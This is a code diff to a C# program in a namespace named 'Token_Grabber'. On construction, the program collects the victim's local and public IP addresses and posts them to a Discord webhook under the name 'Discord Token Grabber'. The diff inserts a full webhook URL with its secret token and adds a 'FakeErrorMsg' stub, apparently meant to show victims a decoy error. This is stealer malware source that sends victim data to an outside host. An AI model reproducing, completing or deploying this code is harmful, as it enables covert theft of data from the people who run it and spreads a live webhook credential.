@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.Collections.Specialized;
 using System.Linq;
@@ -12,13 +12,15 @@ namespace Token_Grabber
     public class PrintAllInfo
     {
         public static string weblink = ("https://api.ipify.org/");
-        public static string? internalip;
+        public static string internalip = "Nothing";
         public PrintAllInfo()
         {
             SendInfo();
         }
 
-
+        /// <summary>
+        /// Get Local IP
+        /// </summary>
         public static void GetLocalIPAddress()
         {
             var host = Dns.GetHostEntry(Dns.GetHostName());
@@ -38,7 +40,7 @@ namespace Token_Grabber
         {
             GetLocalIPAddress();
             //Discord webhook url
-            string url = "";
+            string url = "https://discord.com/api/webhooks/960218299042508860/asK8bqJGh8I2EKSgCw2cQgrjAhwiiujHwZ39nwjD5WMNI8DkfBAT33NJcDTpROhXZJtk";
             string json = "{\"username\": \"Discord Token Grabber\",\"embeds\":[ {\"description\": \"\\n \\n \\n \\n \\n\", \"title\":\"Info:\", \"color\":1018364}] }";
 
             string newjson = json.Insert(65, $"Public IP: {GetIp()}");
@@ -57,6 +59,7 @@ namespace Token_Grabber
                 }
                 catch { }
             }
+
         }
 
         /// <summary>
@@ -73,14 +76,19 @@ namespace Token_Grabber
                 sw.Write(escapedjson);
             wr.GetResponse();
         }
+
         /// <summary>
-        /// Method returns ip
+        /// Returns public ip
         /// </summary>
-        /// <returns></returns>
         public static string GetIp()
         {
             string ip = new WebClient().DownloadString(weblink);
             return ip;
+        }
+
+        public static string FakeErrorMsg(string error)
+        {
+            return error;
         }
 
 
